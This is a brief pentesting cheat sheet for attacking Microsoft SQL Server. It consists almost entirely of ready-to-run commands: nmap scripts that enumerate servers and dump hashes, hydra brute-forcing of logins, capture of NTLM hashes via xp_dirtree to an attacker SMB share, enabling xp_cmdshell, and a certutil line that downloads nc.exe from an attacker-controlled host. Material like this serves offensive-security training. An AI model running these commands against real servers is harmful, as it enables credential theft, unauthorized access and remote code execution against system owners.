# MSSQL - 1443

#### Get information <a href="#get-information" id="get-information"></a>

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

#### Brute force <a href="#brute-force-5" id="brute-force-5"></a>

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
```

#### Having credentials <a href="#having-credentials" id="having-credentials"></a>

```
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
mssqlclient.py <USER>:<PASSWORD>@<IP>

# Once logged in you can run queries:
SQL> select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL> enable_xp_cmdshell

# Execute code
SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
```

#### Manual exploit <a href="#manual-exploit" id="manual-exploit"></a>

```
Cheatsheet :
	- https://www.asafety.fr/mssql-injection-cheat-sheet/
```
